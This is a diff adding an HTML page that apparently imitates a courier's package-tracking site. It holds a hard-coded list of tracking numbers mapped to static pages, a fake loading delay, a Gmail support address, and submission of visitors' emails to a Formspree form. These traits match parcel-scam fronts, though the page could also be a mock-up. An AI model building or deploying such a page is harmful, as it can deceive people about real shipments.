@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Track Your Package | Express Delivery</title>
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@3.2.0/fonts/remixicon.css" rel="stylesheet" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="shortcut icon" href="/assets/logo4.png" type="image/webp" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      height: 100%;
+    }
+
+    body {
+      font-family: 'Urbanist', sans-serif;
+      background: linear-gradient(to right, #005eff, #0039a6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 2rem;
+    }
+
+    .tracking__box {
+      background-color: #fff;
+      color: #333;
+      padding: 3rem 2rem;
+      border-radius: 1rem;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+    }
+
+    .tracking__box h2 {
+      font-size: 1.9rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      color: #0039a6;
+    }
+
+    .tracking__box p {
+      font-size: 1rem;
+      color: #555;
+      margin-bottom: 2rem;
+    }
+
+    .tracking__form input {
+      width: 100%;
+      padding: 0.9rem 1rem;
+      font-size: 1rem;
+      border: 2px solid #ccc;
+      border-radius: 0.6rem;
+      margin-bottom: 1.5rem;
+      outline: none;
+      transition: 0.3s;
+    }
+
+    .tracking__form input:focus {
+      border-color: #005eff;
+    }
+
+    .tracking__form button {
+      width: 100%;
+      padding: 0.9rem;
+      font-size: 1rem;
+      font-weight: 600;
+      background-color: #005eff;
+      color: #fff;
+      border: none;
+      border-radius: 0.6rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .tracking__form button:hover {
+      background-color: #0039a6;
+    }
+
+    .footer__note {
+      margin-top: 2rem;
+      font-size: 0.85rem;
+      color: #666;
+    }
+
+    .footer__note a {
+      color: #005eff;
+      text-decoration: none;
+    }
+
+    .error {
+      color: red;
+      font-size: 0.9rem;
+      margin-top: 1rem;
+    }
+
+    .loading {
+      font-size: 1rem;
+      color: #0039a6;
+      margin-top: 1rem;
+    }
+
+    @media screen and (max-height: 600px) {
+      body {
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="tracking__box">
+    <h2>Track Your Package</h2>
+    <p>Enter your tracking number below to get the latest update on your shipment.</p>
+    <form class="tracking__form" id="trackingForm">
+      <input type="email" id="email" name="email" placeholder="Enter your email" required />
+      <input type="text" id="trackingNumber" name="tNumber" placeholder="e.g. EXPD123456789012" maxlength="18"
+        required />
+      <button type="submit">Track Now</button>
+    </form>
+
+
+    <div id="loadingMsg" class="loading" style="display: none;">Loading...</div>
+    <div id="errorMsg" class="error"></div>
+    <div class="footer__note">
+      Need help? <a href="mailto:cexpressdelivery543@gmail.com">Contact Support</a>
+    </div>
+  </div>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("trackingForm");
+    const errorMsg = document.getElementById("errorMsg");
+    const loadingMsg = document.getElementById("loadingMsg");
+
+    const trackingRoutes = {
+      "EXPD48920173659281": "track-package.html",
+      "EXPD84930271543861": "track-package1.html",
+      "EXPD93726548192753": "track-package2.html",
+      "EXPD72849013584627": "track-package3.html",
+      "EXPD59027416839275": "track-package4.html",
+      "EXPD38412095746388": "track-package5.html",
+      "EXPD61928374019284": "track-package6.html",
+      "EXPD47018293475612": "track-package7.html",
+      "EXPD85309261738492": "track-package8.html",
+      "EXPD36584910273645": "track-package9.html",
+      "EXPD74190382659174": "track-package10.html"
+    };
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      errorMsg.textContent = "";
+      loadingMsg.style.display = "block";
+
+      const trackingNumber = document.getElementById("trackingNumber").value.trim().toUpperCase();
+      const email = document.getElementById("email").value.trim();
+
+      setTimeout(() => {
+        loadingMsg.style.display = "none";
+
+        if (trackingRoutes[trackingNumber]) {
+          // ✅ Submit to Formspree
+          const jsonData = {
+            trackingNumber: trackingNumber,
+            email: email
+          };
+
+          fetch("https://formspree.io/f/mdkenbez", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Accept": "application/json"
+            },
+            body: JSON.stringify(jsonData)
+          })
+          .then(response => {
+            if (response.ok) {
+              // ✅ Redirect to correct page
+              window.location.href = trackingRoutes[trackingNumber];
+            } else {
+              alert("Submission failed. Please try again.");
+            }
+          })
+          .catch(error => {
+            console.error("Formspree error:", error);
+            alert("An error occurred while submitting your data.");
+          });
+
+        } else {
+          errorMsg.textContent = "Tracking number not found. Please check and try again.";
+        }
+      }, 2500);
+    });
+  });
+</script>
+
+
+
+</body>
+
+</html>
